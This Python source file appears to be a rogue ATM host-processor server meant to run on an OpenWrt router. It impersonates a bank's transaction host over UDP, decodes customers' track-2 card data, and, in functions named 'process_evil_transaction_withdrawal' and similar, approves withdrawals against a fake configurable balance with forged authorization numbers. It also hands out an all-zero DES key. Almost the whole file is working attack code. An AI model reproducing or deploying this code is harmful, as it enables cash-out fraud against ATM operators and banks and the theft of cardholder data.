# 2019 wasabi and jrwr
import os
import sys
import pyDes
import string
import traceback
import time
import socket
import SocketServer
import datetime
import json
from pprint import pprint
from random import randint
import logging
import logging.handlers

logs = logging.getLogger('MyLogger')
logs.setLevel(logging.DEBUG)

handler = logging.handlers.SysLogHandler(address = '/dev/log')

logs.addHandler(handler)

OPENWRTMODE=True


if OPENWRTMODE:
	import subprocess
	

# code needs some serious cleanup and switch from prints to loggers.

BCODE = "000"
BPERSON = "Tom Crosant"
BBALANCE = 10000
BFEE = "10"

APIURL = "http://127.0.0.1"
HOST, PORT = "0.0.0.0", 2265
ENDPOINT = True


# edit here to setup new ATMS from IDs... 
ATMLIST = {
	'81236918':'127.0.0.1'
}

BANKDATA={}

def openwrt_updates():
	global BCODE,BPERSON,BBALANCE
	import subprocess
	DEBUG=False
	def get_setting(key_name):
		command = str("uci show "+key_name).split(" ")
		pprint(command)
		outs = None
		try:
			proc = subprocess.Popen(command,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			outs, errs = proc.communicate() #timeout=15)
			if outs is not None and outs != '' and "=" in outs:
				outs = str(outs).strip().replace("'","").replace("'","").split("=")
				if len(outs)>1:
					outs = outs[1]
			else:
				outs = None
		except Exception as e:
			#proc.kill()
    			#outs, errs = proc.communicate()
			print("error while reading config",e)
		pprint(outs)
		return str(outs).strip()
	# things we look for
	if OPENWRTMODE:
		check_balance = "atm_setup.config.balance"
		check_fee = "atm_setup.config.fee"
		check_enabled = "atm_setup.config.enabled"
		check_name = "atm_setup.config.name"
		c = get_setting(check_balance)
		if c is not None:
			if DEBUG:
				print("updating BBALANCE",c)
			BBALANCE=c
		c = get_setting(check_fee)
		if c is not None:
			if DEBUG:
				print("updating BFEE",c)
			BFEE=c
		c = get_setting(check_enabled)
		if c is not None:
			if DEBUG:
				print("updating BCODE",c)
			if int(c) != 1:
				BCODE="111"
			else:
				BCODE="000"
		c = get_setting(check_name)
		if c is not None:
			BPERSON=c

def calcLRC(input):
	checksum = 0
	for el in input:
			checksum ^= ord(el)
	return checksum

def circularBuf(buf,size,char):
	if  (len(buf)+1) > (size):
			return buf[len(buf)-size:]+char
	else:
			return buf+char

def fixParity(m):
		return chr(clearBit(ord(m),7))

def convertCtrlChar(input):
	ser = {
			0x02: "STX",
			0x03: "ETX",
			0x04: "EOT",
			0x05: "ENQ",
			0x06: "ACK",
			0x15: "NAK",
			0x1C: "FS"
	}
	if input in ser:
			return "[%s]"%ser[input]
	else:
			return "[UNK:%s]"%input.encode('hex')

def nicePrint(buf,m="Packet"):
	import binascii
	nice_output = ""
	for b in buf:
			if b in string.printable:
					nice_output+=b
	print("%s Raw:  %s"%(m,nice_output))
	print("%s Buf: %s"%(m,buf.encode('hex')))
	b = ' '.join(format(ord(x), 'b') for x in buf)
#	   print("%s Binary: %s"%(m,str(b)))


def makeMessage(buf,parity_msg=True,parity_lrc=False):
	parity_end = 7 # 0 is first char
	fin_msg = ""
	for ch in buf:
			och = ord(ch)
			if parity_msg and parityEven(och):
					och = setBit(och,parity_end)
			fin_msg+=chr(och)
	rawlrc = calcLRC(buf) # checksum
	if parity_lrc and parityEven(rawlrc):
			rawlrc = setBit(rawlrc,parity_end)
	ret = "\x82" + fin_msg + chr(rawlrc)
	nicePrint((ret),"SENDMESSAGE ")
	return ret

def parityEven(int_type):
	parity = 0
	while (int_type):
			parity = ~parity
			int_type = int_type & (int_type - 1)
	return (parity<0)

def parityOdd(int_type):
	parity = 0
	while (int_type):
			parity = ~parity
			int_type = int_type & (int_type - 1)
	return (parity>0)

def setBit(int_type, offset):
	mask = 1 << offset
	return(int_type | mask)

def clearBit(int_type, offset):
	mask = ~(1 << offset)
	return(int_type & mask)

def getChunk(msg,size,offset=0):
	chunk = msg[offset:offset+size]
	print("Got: [%d,%d]%s"%(offset,offset+size,chunk.encode('hex')))
	return chunk

def decodeCard(track):
	FS = "="
	track=track.lstrip(';')
	pprint(track)
	print("got cc card id track 0 ",track[0])
	if len(track)>0:
		offset = 0
		field = {}
		card_split = track.split(FS)
		field['primary_account_number']=card_split[0]
		track = card_split[1]
		field['expiration_date'] = datetime.datetime.strptime(getChunk(track,4,offset),"%y%m")
		offset+=4
		field['service_code'] = getChunk(track,3,offset)
		offset+=3
		field['discretionary_data']=getChunk(track,(len(track)-(2+offset)),offset)
		return field
	else:
		return None

###########################################################################################

class Transactions():
	# OMG  BBBQ WTF
	def __init__(self):
		self.transaction_table_messages = {
			'01': 'Change PIN. Must send PIN Change PIN Block (Misc. field) along with this code.',
			'11': 'Cash Withdrawal from primary checking account',
			'12': 'Cash Withdrawal from primary savings account',
			'15': 'Cash Withdrawal from primary credit card account',
			'21': 'Transfer from primary checking account to savings account',
			'22': 'Transfer from primary savings account to checking account',
			'25': 'Transfer from primary credit card account to primary checking account',
			'29': 'Reversal of latest transaction',
			'31': 'Primary checking account balance inquiry',
			'32': 'Primary Savings account balance inquiry',
			'35': 'Primary Credit card balance inquiry',
			'41': 'Non-Cash Withdrawal from primary checking account (POS type transaction)',
			'42': 'Non-Cash Withdrawal from primary savings account (POS type transaction)',
			'43': 'Quasicash pinless purchase from primary credit account (POS type transaction)',
			'44': 'Non-Financial prepaid online transaction (POS type transaction)',
			'45': 'Non-Cash Withdrawal from primary credit card account (POS type transaction)',
			'46': 'Send Money from Checking',
			'47': 'Send Money from Savings',
			'48': 'Check Cashing Withdrawal',
			'49': 'Receive Money',
			'50': 'Get host totals (do not change business day or reset totals)',
			'51': 'Get host totals (Change business date and reset totals)',
			'52': 'Recharge existing long distance calling plan.',
			'53': 'Purchase new long distance calling plan. Use with misc field xr.',
			'60': 'Download configuration table',
			'61': 'Cash Withdrawal from primary checking account using Miscellaneous Field ID e in request message for amount.',
			'62': 'Cash Withdrawal from primary savings account using Miscellaneous Field ID e in request message for amount.'
		}
		self.transaction_table_calls = {
			'01': None,
			'11': self.process_evil_transaction_withdrawal,
			'12': self.process_evil_transaction_withdrawal,
			'15': self.process_invalid_message,
			'21': self.process_invalid_message,
			'22': self.process_invalid_message,
			'25': self.process_invalid_message,
			'29': self.process_reversal_message,
			'31': self.process_evil_transaction_balance_checking,
			'32': self.process_evil_transaction_balance_checking,
			'35': self.process_invalid_message,
			'41': self.process_invalid_message,
			'42': self.process_invalid_message,
			'43': self.process_invalid_message,
			'44': self.process_invalid_message,
			'45': self.process_invalid_message,
			'46': self.process_invalid_message,
			'47': self.process_invalid_message,
			'48': self.process_invalid_message,
			'49': self.process_invalid_message,
			'50': self.process_host_totals,
			'51': self.process_host_totals,
			'52': self.process_invalid_message,
			'53': self.process_invalid_message,
			'60': self.process_download_request,
			'61': self.process_invalid_message,
			'62': self.process_invalid_message
		}

	def parseHeader(self,buf):
		field = {}
		offset=1

#			pprint(buf.encode('hex'))
		fields = buf.split('\x1c')
		if len(fields[0])>(18):
			logs.warning(">> DEBUG MODE DETECTED FROM ATM")
			field['communications_identifier'] = getChunk(buf,8,offset)
			offset+=8
			field['terminal_id'] = getChunk(buf,2,offset)
			offset+=2
			field['software_version'] = getChunk(buf,2,offset)
			offset+=2
			field['encryption_flag'] = getChunk(buf,1,offset)
			offset+=1
			field['information_header'] = getChunk(buf,7,offset)
			offset+=1 # FS
			offset+=7
			field['terminal_id'] = getChunk(buf,15,offset)
			offset+=1 # FS
			offset+=15
			field['transaction_code'] = getChunk(buf,2,offset)
			offset+=2
		else:
			field['terminal_id'] = getChunk(buf,15,offset)
			offset+=15
			offset+=1 # FS
			field['transaction_code'] = getChunk(buf,2,offset)
			offset+=2
			offset+=1 # FS
		field['msg'] = buf[(offset):]
		field['body_offset']=offset
		return field

	# encryption key should be changed at some point i think !!!!!!!
	def process_download_request(self,termid,msg,action,enc_id="~"):
		tdes = pyDes.des(('\00'*8), pyDes.ECB)
		encrypted_key = tdes.encrypt('\00'*8)
		#int(str(encrypted_key),"ENCRYPTED ATM")
		msg = termid  + '\x1c' + action + '\x1c' + enc_id + encrypted_key.encode('hex') + '\x1c' + '\x03'
		return makeMessage(msg,True,True)

	def pgen(self,termid,msg,action):
		return self.process_transaction_withdrawal_savings(termid,msg,action)

	def process_host_totals(self,termid,msg,tcode='50'):
		# encryption key should be changed at some point i think !!!!!!!
		bus_date = time.strftime('%m%d%y')
		#msg = termid  + '\x1c' + "50" + '\x1c' + time.strftime('%m%d%y')  + '\x1c' + "0000 0000 0000 0000 0000" + '\x1c' + '\x03'
		msg = termid + '\x1c' + str(tcode) + '\x1c' + bus_date + '\x1c' + '0'*4 + '0'*4 +'0'*4 + "00000005" + '\x1c' + '\x03'
		nicePrint(msg,"Sending Host Total:")
		return makeMessage(msg,True,True)

	def process_transaction_message(self,termid,msg,action):
		# generic handler
		hdr = self.parseHeader(msg)
		bdy_offset = int(hdr['body_offset'])
		# we now can process the body of the message
		body = msg[bdy_offset:]
		body_split = body.split('\x03')[0].split('\x1c')
		body_split = filter(None, body_split) # remove nulls
		pprint(body_split)
		body_headers = ['sequence_number','track2','amount1','amount2','pin_block','misc1','misc2']
		body_elements = dict(zip(body_headers[:len(body_split)],body_split))
		# now we can work with all elements
		#if 'sequence_number' in body_elements.keys():
		#	body_elements['sequence_number'] = int(body_elements['sequence_number']
		if 'amount1' in body_elements.keys():
			body_elements['amount1'] = int(body_elements['amount1'])/100
		if 'amount2' in body_elements.keys():
			body_elements['amount2'] = int(body_elements['amount2'])/100
		amount = body_elements['amount1']
		fee = body_elements['amount2']
		#body_elements['amount']=amount
		#action = hdr['transaction_code']
		return (action,amount,fee,hdr,body_elements)

	def process_transaction_withdrawal_savings(self,termid,msg,action):
		# TODO: payment processing function from algorythm oncr addfed
		a,amount,fee,hdr,body = self.process_transaction_message(termid,msg,action)
		pprint(hdr)
		pprint(body)
		# process here
		response_code = "000"
		authorization_number = str(''.join(["{}".format(randint(0, 9)) for num in range(0, 8)]))
		print(fee)
		print(amount)
		fee = "0".zfill(8)
		balance = str((amount)*100).zfill(8)
		amount = "-" + str((amount)*100).zfill(8)
		# API CALL
		try:
			bq = BankQuery()
			bq.lookup(body['track2'])
			bbq = bq.withdraw(amount,'savings')
			response_code = bbq[0]
			bbq = bq.lookup(body['track2'])
			savings_acc = bbq[2]
			balance = str((int(savings_acc['currentbalance'])+int(amount))*100).replace("-","").zfill(8)
			#balance = str((str(savings_acc['currentbalance']).replace("-",""))*100).zfill(8)
			print("Deducting %s from %s to make %s"%(str(amount),str(savings_acc['currentbalance']),str(balance)))
		except Exception as e:
			traceback.print_exc()
			response_code = "111" # 2424
		# repeating stuff here... sadly
		multi_part_message = "0" # not set
		trasac_date = time.strftime('%m%d%y')
		trasac_time = time.strftime('%H%M%S')
		bus_date = time.strftime('%m%d%y')
		msg = multi_part_message + '\x1c' + termid + '\x1c' + action + '\x1c' + body['sequence_number'] + "\x1c" + str(response_code) + "\x1c" + str(authorization_number) + "\x1c" + str(trasac_date) + "\x1c" + str(trasac_time) + "\x1c" + str(bus_date) + "\x1c" + balance + "\x1c" + fee + "\x1c" + "\x1c" + "\x03"
		nicePrint(msg,"Transaction PROCESS SEND:")
		return makeMessage(msg,True,True)


	def process_evil_prompt_balance_checking(self,termid,msg,action):
		# TODO: payment processing function from algorythm oncr addfed
		a,amount,fee,hdr,body = self.process_transaction_message(termid,msg,action)
		pprint(hdr)
		pprint(body)
		# process here
		response_code = "000"
		authorization_number = str(''.join(["{}".format(randint(0, 9)) for num in range(0, 8)]))
		print(fee)
		print(amount)

		## start here
		#currentbalance=10000 # or 0
		track = decodeCard(body['track2'])
		pprint(track)
		currentbalance=BBALANCE
		print("\n\nCustomer: %s (%s) has balance of %s"%(BPERSON,track['primary_account_number'],currentbalance))
		fee=0
		try:
			currentbalance=int(raw_input("Enter (new) account balance: "))
			fee = int(raw_input("Enter fee for ATM: "))
		except:
			print("invalid string, continuing with defaults %s"%str(currentbalance))
		# API CALL
		try:
			balance = str(int(currentbalance)*100).replace("-","").zfill(8)
			print("Current bank balance for %s is: $ %s translated to %s"%(str(track['primary_account_number']),str(currentbalance),str(balance)))
		except Exception as e:
			traceback.print_exc()
			response_code = "034"
		print("\n")
		pprint("got response %s"%response_code)
		print("\n\n\n")
		# repeating stuff here... sadly
		fee = str(fee).zfill(8)
		multi_part_message = "0" # not set
		trasac_date = time.strftime('%m%d%y')
		trasac_time = time.strftime('%H%M%S')
		bus_date = time.strftime('%m%d%y')
		msg = multi_part_message + '\x1c' + termid + '\x1c' + action + '\x1c' + body['sequence_number'] + "\x1c" + str(response_code) + "\x1c" + str(authorization_number) + "\x1c" + str(trasac_date) + "\x1c" + str(trasac_time) + "\x1c" + str(bus_date) + "\x1c" + balance + "\x1c" + fee + "\x1c" + "\x1c" + "\x03"
		nicePrint(msg,"Transaction PROCESS:")
		return makeMessage(msg,True,True)


	def process_evil_transaction_balance_checking(self,termid,msg,action):
		# TODO: payment processing function from algorythm oncr addfed
		a,amount,fee,hdr,body = self.process_transaction_message(termid,msg,action)
		pprint(hdr)
		pprint(body)
		# process here
		response_code = BCODE
		authorization_number = str(''.join(["{}".format(randint(0, 9)) for num in range(0, 8)]))
		print(fee)
		print(amount)

		## start here
		#currentbalance=10000 # or 0
		currentbalance=randint(0,100000) # for some fun
		track = decodeCard(body['track2'])
		pprint(track)
		currentbalance=BBALANCE
		print("\n\nCustomer: %s (%s) has balance of %s"%(BPERSON,track['primary_account_number'],currentbalance))
		fee = int(BFEE)

		# API CALL
		try:
			balance = str(int(currentbalance)*100).replace("-","").zfill(8)
			print("\n\nCurrent bank balance for %s is: $ %s translated to %s\n\n"%(str(track['primary_account_number']),str(currentbalance),str(balance)))
		except Exception as e:
			traceback.print_exc()
			response_code = "034"
		print("\n")
		pprint("got response %s"%response_code)
		print("\n\n\n")
		# repeating stuff here... sadly
		fee = str(fee).zfill(8)
		multi_part_message = "0" # not set
		trasac_date = time.strftime('%m%d%y')
		trasac_time = time.strftime('%H%M%S')
		bus_date = time.strftime('%m%d%y')
		msg = multi_part_message + '\x1c' + termid + '\x1c' + action + '\x1c' + body['sequence_number'] + "\x1c" + str(response_code) + "\x1c" + str(authorization_number) + "\x1c" + str(trasac_date) + "\x1c" + str(trasac_time) + "\x1c" + str(bus_date) + "\x1c" + balance + "\x1c" + fee + "\x1c" + "\x1c" + "\x03"
		nicePrint(msg,"Transaction PROCESS:")
		return makeMessage(msg,True,True)


	def process_evil_transaction_withdrawal(self,termid,msg,action):
		# TODO: payment processing function from algorythm oncr addfed
		a,amount,fee,hdr,body = self.process_transaction_message(termid,msg,action)
		pprint(hdr)
		pprint(body)

		# !!!!! LOOK HERE !!!!!!
		# set value of amount due to 0 and fee to 10, next set both to 0 and deduct
		response_code = BCODE # 000 = success , 111 = failure
		total_balance = BBALANCE # infinite money
		track = decodeCard(body['track2'])
		print("\n\nCustomer: %s (%s) has balance of %s"%(BPERSON,track['primary_account_number'],total_balance))
		fee = int(BFEE) # 5000 e.g. 50.00

		authorization_number = str(''.join(["{}".format(randint(0, 9)) for num in range(0, 8)]))
		try:
			calculation = (int(total_balance)-((int(amount)*1)+int(fee)))
			balance = str(calculation*100).replace("-","").zfill(8)
			print("\n!!!Deducting (%s+%s) [%s] from %s to make %s\n"%(str(amount),str(fee),str((amount+fee)),str(total_balance),str(balance)))
		except Exception as e:
			traceback.print_exc()
			response_code = "111" # 2424
		# repeating stuff here... sadly
		print("\n\n\n")
		fee = str(fee*100).zfill(8)
		total_balance=str(total_balance*100).zfill(8)
		multi_part_message = "0" # not set
		trasac_date = time.strftime('%m%d%y')
		trasac_time = time.strftime('%H%M%S')
		bus_date = time.strftime('%m%d%y')
		msg = multi_part_message + '\x1c' + termid + '\x1c' + action + '\x1c' + body['sequence_number'] + "\x1c" + str(response_code) + "\x1c" + str(authorization_number) + "\x1c" + str(trasac_date) + "\x1c" + str(trasac_time) + "\x1c" + str(bus_date) + "\x1c" + balance + "\x1c" + fee + "\x1c" + "\x1c" + "\x03"
		nicePrint(msg,"Transaction PROCESS SEND:")
		return makeMessage(msg,True,True)

	def process_reversal_message(self,termid,msg,action):
		# generic handler
		hdr = self.parseHeader(msg)
		bdy_offset = int(hdr['body_offset'])
		# we now can process the body of the message
		body = msg[bdy_offset:]
		body_split = body.split('\x03')[0].split('\x1c')
		body_split = filter(None, body_split) # remove nulls
		body_headers = ['sequence_number','track2','amount1','amount2','amount3']
		body_elements = dict(zip(body_headers[:len(body_split)],body_split))
		pprint(body_elements)
		pprint(body_headers)
		# now we can work with all elements
		#if 'sequence_number' in body_elements.keys():
		#	body_elements['sequence_number'] = int(body_elements['sequence_number']
		if 'amount1' in body_elements.keys():
			body_elements['amount1'] = int(body_elements['amount1'])/100
		if 'amount2' in body_elements.keys():
			body_elements['amount2'] = int(body_elements['amount2'])/100
		if 'amount3' in body_elements.keys():
			body_elements['amount3'] = int(body_elements['amount3'])/100
		amount = body_elements['amount1']-(body_elements['amount2']+body_elements['amount3'])
		body_elements['amount']=amount
		#action = hdr['transaction_code']
		response_code = "111" # 000 = approved, 111 = declined
		# build response
		trasac_date = time.strftime('%m%d%y')
		trasac_time = time.strftime('%H%M%S')
		bus_date = time.strftime('%m%d%y')
		# TODO: payment processing function from algorythm oncr addfed

		msg = termid + '\x1c' + action + '\x1c' + body_elements['sequence_number'] + "\x1c" + response_code + "\x1c" + "\x03"

		return makeMessage(msg,True,True)

	def process_invalid_message(self,termid,msg,action,code='023'):
		# generic handler
		hdr = self.parseHeader(msg)
		bdy_offset = int(hdr['body_offset'])
		# we now can process the body of the message
		body = msg[bdy_offset:]
		body_split = body.split('\x03')[0].split('\x1c')
		body_split = filter(None, body_split) # remove nulls
		body_headers = ['sequence_number','track2','amount1','amount2','amount3']
		body_elements = dict(zip(body_headers[:len(body_split)],body_split))

		response_code = str(code).zfill(3)
		# build response
		trasac_date = time.strftime('%m%d%y')
		trasac_time = time.strftime('%H%M%S')
		bus_date = time.strftime('%m%d%y')
		# TODO: payment processing function from algorythm oncr addfed

		msg = termid + '\x1c' + action + '\x1c' + body_elements['sequence_number'] + "\x1c" + response_code + "\x1c" + "\x03"

		return makeMessage(msg,True,True)

	def processMessage(self,buf):
		hdr = self.parseHeader(buf)
		pprint(hdr)
		# update openwrt handlers if applicable 
		openwrt_updates()
		# and continue 
		if 'transaction_code' not in hdr:
			return None
		termid = hdr['terminal_id']
		action = hdr['transaction_code']
		action_str = str(action)
		action_int = int(action_str)
		if action_str in self.transaction_table_calls:
			if self.transaction_table_calls[action_str] is not None:
				print(">> Reached: %s: Attempting to call handler..."%str(self.transaction_table_messages[action_str]))
				# we are in good state
				return self.transaction_table_calls[action_str](termid,buf,action)
		else:
			print(">> Unknown Message: Sending Invalid Message Response %s"%(str(action_str)))
			self.process_invalid_message(termid,buf,action)
			nicePrint(buf,"Unkown Message Packet: ")
		return None

class ATMMultiHandler(SocketServer.BaseRequestHandler):
	def atmtoip(self,rid):
		global ATMLIST
		id = str(rid).replace(" ","").strip()
		if id in ATMLIST:
			return ATMLIST[id]
		else:
			#print("ERROR: %s not found in IP LIST!"%str(id))
			return None

	def relay(self,msg,host,port=2265):
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(msg, (host, port))
		received = sock.recv(1024)
		sock.close()
		return received

	def handle(self):
		global ENDPOINT,APIURL
		t = Transactions()
		data = self.request[0]
		hdr = t.parseHeader(data)
		print("GOT MESSAGE")
		if 'terminal_id' not in hdr:
			logs.error("Error! Error parsing message!")
			nicePrint(data)
			return None
		else:
			m = None
			if ENDPOINT:
				host = self.atmtoip(hdr['terminal_id'])
				m = t.processMessage(data)
			else:
				host = self.atmtoip(hdr['terminal_id'])
				if host is None:
					logs.error("Error! Unable to find IP<--->ATM ID mapping!")
					nicePrint(data)
					return None
				m = self.relay(data,host)
			socket = self.request[1]
			socket.sendto(m, self.client_address)
			#socket.close()
			"""
			m = t.processMessage(data)
			if m is None:
				print("Error! Decode Failure!")
				m = data
			"""

class ThreadedUDPServer(SocketServer.ThreadingMixIn, SocketServer.UDPServer):
	pass

if __name__ == "__main__":
	run = True
	try:
		server = ThreadedUDPServer((HOST, PORT), ATMMultiHandler)
		server.serve_forever()

		server = ThreadedUDPServer((HOST, PORT), ATMMultiHandler)
		ip, port = server.server_address
		server_thread = threading.Thread(target=server.serve_forever)
		# Exit the server thread when the main thread terminates
		server_thread.daemon = True
		server_thread.start()
		print "Server loop running in thread:", server_thread.name
 		while run:
 			time.sleep(0.250)
	except Exception as e:
		traceback.print_exc()
		if e is KeyboardInterrupt:
			run = False
			server.shutdown()
			server.server_close()
			sys.exit(1)
